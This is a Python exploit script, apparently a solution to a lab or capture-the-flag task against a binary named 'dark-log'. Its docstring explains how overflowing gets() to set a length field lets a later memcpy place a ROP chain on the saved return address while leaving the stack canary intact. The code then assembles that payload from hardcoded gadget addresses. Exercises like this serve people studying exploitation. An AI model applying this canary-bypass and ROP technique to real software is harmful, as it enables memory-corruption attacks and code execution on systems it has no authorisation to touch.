#!/usr/bin/env python3
"""Task 4: bypass the stack canary in dark-log.

struct log_frame layout on the stack (rbp-relative):

    rbp-0x120  expression[128]
    rbp-0x0a0  logMsg[128]
    rbp-0x020  int len              <- gets() can still reach this
    rbp-0x01c  char pad[8]
    rbp-0x008  canary               <- must stay untouched
    rbp+0x000  saved rbp
    rbp+0x008  return address

input() does:  memcpy(logMsg + len, expression, 128)

So we write exactly up to (and including) len, never touching the canary, and
set len = 0xa8.  Then logMsg + len == rbp + 8: the memcpy itself writes our
ROP chain straight onto the saved return address, and the canary check that
runs afterwards still sees the original value.

    dst = (rbp - 0x120) + 0x80 + len = rbp - 0xa0 + len
    len = 0xa8  ->  dst = rbp + 8

Chain: pop rdi ; 4 ; ret ; grade_eval ; ret ; main.
Returning into main() lets the program finish normally (gets() sees EOF, input()
returns, "Log saved." is printed, main returns to libc and exits) instead of
segfaulting after the flag.
"""
import sys
from struct import pack

POP_RDI    = 0x4018A3     # pop rdi ; ret   (inside __libc_csu_init epilogue)
RET        = 0x4018A4     # ret
GRADE_EVAL = 0x401677
MAIN       = 0x4017F5

chain  = pack("<Q", POP_RDI)
chain += pack("<Q", 4)
chain += pack("<Q", RET)          # alignment fix before grade_eval
chain += pack("<Q", GRADE_EVAL)
chain += pack("<Q", RET)          # alignment fix before main
chain += pack("<Q", MAIN)

payload  = chain.ljust(0x80, b"\x00")   # expression[128]  -> copied to rbp+8
payload += b"\x00" * 0x80               # logMsg[128]
payload += pack("<I", 0xA8)             # len = 0xa8

sys.stdout.buffer.write(payload + b"\n")
